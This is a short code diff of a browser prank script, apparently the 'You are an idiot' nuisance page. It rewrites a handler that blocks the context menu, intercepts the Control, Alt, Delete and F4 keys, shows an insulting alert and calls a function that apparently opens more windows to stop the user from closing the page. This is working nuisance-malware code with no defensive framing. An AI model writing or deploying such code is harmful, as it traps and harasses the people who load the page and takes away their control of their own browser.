@@ -11,10 +11,13 @@ container.addEventListener('click', async () => {
 
 window.onload = playBall;
 window.oncontextmenu = () => false;
-window.onkeydown = async () => {
-	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
-		await proCreate(6);
-		alert("You are an idiot!");
+
+window.onkeydown = function() {	
+	var keyCode = event.keyCode;
+	
+	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
+    	alert("You are an idiot!");
+		proCreate();
 	}
 	
 	return null;
